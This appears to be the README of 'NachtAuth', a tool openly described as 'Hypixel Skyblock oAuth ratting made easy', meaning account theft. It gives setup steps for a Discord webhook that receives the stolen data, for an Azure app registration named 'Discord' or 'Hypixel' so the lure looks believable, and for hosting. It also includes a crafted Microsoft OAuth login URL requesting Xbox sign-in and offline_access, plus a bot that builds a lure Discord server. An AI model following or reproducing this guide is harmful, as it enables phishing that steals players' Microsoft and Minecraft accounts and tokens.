# NachtAuth
Hypixel Skyblock oAuth ratting made easy

# Setup

## Config
First, you need to set a discord webhook in the "config.json" file 
Next, set a Hypixel api key in the config as well.

at this point, it should look something like this:
```json
{
    "networth": {
        "apiKey": "9f96947b-82ce-4337-9667f-7d4fd7bbi35473"
    },
    "URLS": {
        "redirect_uri": "",
        "apiURL": ""
    },
    "webhook": {
        "webhookURL": "https://discord.com/api/webhooks/xxxxx"
    },
    "discord": {
        "bot_token": ""
    },
    "azure" : {
        "client_id": "",
        "client_secret": "",
        "redirect_uri": ""
    }
}
```

## Installing Requirements
[NodeJS](https://nodejs.org/download)
```js
npm install axios
npm install skyhelper-networth
npm install body-parser
npm install express
npm install iplim
```
[Python](https://python.org/download)
```python
pip install py-cord
```

## Azure App Registration Part 1
*Contrary to popular belief, this is actually very easy!*

First, visit [Microsoft Azure's](https://portal.azure.com/#create/hub) website. <sub>You might have to create an account I forgot</sub>

Next, at the search top bar, search for "App registrations"

Then, click "New registration" in the top left corner

Next, type any name you want. To make it believable, you can choose something like "Discord" or "Hypixel"

Now, we'll come back to this later.

## Hosting
If you want to host it on a vps, you can use DigitalOcean and get a free 200$ of credit for 2 months for only paying 5$

You can also use [OnRender](https://onrender.com/), it's free and just like heroku but with super slow upload times but it works perfectly fine

Once you have your OnRender link, go back to App Registration.

## Azure App Registration Part 2
Now, set the redirect uri to your onrender link or your vps if it applies to you. Then set the platform to web.

Reopen config.json and set the client_id to the Application (client) ID on the Azure page.

Then, back on Azure, click "Add a certificate or secret" under Client credentials.

Click "New client secret", the name can be anything you want. It doesn't matter.

Then, click add and copy the Secret ID and set that to client_secret in the config. 

Set the redirect uri you put to the azure as redirect_uri in config

## (Optional): NachtAuth Dashboard

If you want to use the NachtAuth Dashboard, make a new OnRender application and upload the "api" folder to there. 

Once you get the url for your new OnRender app, set it to the apiURL in config.json, also add it to like 44 (leave the /api) in page/script.js because i forgot to change it and am not going to 

# Server Setup

## oAuth URL
Your URL should look like this:

```https://login.live.com/oauth20_authorize.srf?client_id=your_client_id&response_type=code&redirect_uri=your_redirect_url&scope=XboxLive.signin+offline_access&state=OK```

## (Optional): Discord Server Setup Bot

Make a discord bot and set the token as bot token in config.json

Start the bot and do `/setup <oauth link>` and watch it set up the server for you! 

# That's all! Enjoy NachtAuth :)
